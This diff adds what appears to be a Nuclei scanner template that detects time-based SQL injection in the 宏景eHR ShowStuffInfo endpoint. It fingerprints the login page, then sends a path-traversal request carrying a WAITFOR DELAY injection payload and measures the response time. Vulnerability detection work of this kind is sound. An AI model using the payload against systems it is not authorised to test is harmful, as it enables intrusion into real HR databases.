@@ -1,0 +1,47 @@
+id: poc-yaml-hongjing-ehr-showstuffinfo-sqli
+info:
+  name: 宏景eHR ShowStuffInfo SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in the 宏景eHR ShowStuffInfo endpoint using WAITFOR DELAY timing.
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /templates/index/hcmlogon.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/css/hcm/login.css"
+
+  - raw:
+      - |
+        GET /templates/attestation/../../jp_contest/personinfo/ShowStuffInfo?id=1';WAITFOR+DELAY+'0:0:{{t1}}'--+ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
